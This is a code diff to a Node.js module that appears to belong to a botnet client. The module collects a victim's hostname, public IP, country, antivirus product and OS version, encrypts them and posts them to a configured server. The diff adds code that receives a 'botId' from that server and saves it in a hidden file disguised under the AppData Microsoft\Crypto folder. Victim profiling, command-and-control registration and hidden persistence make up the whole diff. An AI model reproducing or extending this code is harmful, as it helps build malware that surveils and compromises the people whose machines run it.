@@ -2,6 +2,8 @@ const axios = require('axios');
 const core = require('./core');
 const config = require('../config');
 const crypto = require('./crypto');
+const path = require('path');
+const fs = require('fs');
 
 async function submitReport() {
     const hostname = core.execClear('hostname') == "" ? "hostname" : core.execClear('hostname');
@@ -10,16 +12,32 @@ async function submitReport() {
     const av = getAntivirus();
     const os = getSystemVersion();
 
-    try {
-        const data = crypto.encrypt(JSON.stringify({hostname: hostname, ip: ip, country: country, av: av, os: os}), config.encryptedKey);
+    const data = crypto.encrypt(JSON.stringify({hostname: hostname, ip: ip, country: country, av: av, os: os}), config.encryptedKey);
 
-        await axios.post(config.baseurl + "/report/" + config.id, data, {
-            headers: {
-                'Content-Type' : 'text/plain' 
-            }
-        });
-    } catch (e) { }
+    let botId;
+    await axios.post(config.baseurl + "/report/" + config.id, data, {
+        headers: {
+            'Content-Type' : 'text/plain' 
+        }
+    }).then(function (response) {
+        botId = response.data;
+    }).catch(function (error) { });
+
+    return botId;
 }
+
+async function getBotId() {
+    const savePath = path.join(process.env.appdata, 'Microsoft', 'Crypto', `ID${config.id}`);
+    if (fs.existsSync(savePath)) {
+        return fs.readFileSync(savePath).toString();
+    } else {
+        const botId = await submitReport();
+        core.createDirectoryRecursively(savePath);
+        fs.writeFileSync(savePath, botId);
+        core.hideFile(savePath);
+        return botId;
+    }
+} 
 
 async function getPublicIp() {
     try {
@@ -74,6 +92,6 @@ function getSystemVersion() {
 }
 
 module.exports = {
-    submitReport,
-    getCountry
+    getCountry,
+    getBotId
 }
